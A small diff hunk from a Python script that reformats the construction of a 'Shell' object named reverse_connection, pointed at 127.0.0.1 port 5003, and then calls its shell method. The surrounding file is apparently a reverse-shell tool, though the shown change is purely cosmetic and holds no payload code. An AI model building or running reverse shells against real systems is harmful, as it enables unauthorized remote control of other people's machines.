@@ -75,9 +75,8 @@ if __name__ == "__main__":
     os.system('clear')
 
     reverse_connection = Shell(
-        "127.0.0.1", int(
-            5003
-        )
+        "127.0.0.1", 
+        int(5003)
     )  # define target ip address and target port
     
     reverse_connection.shell()
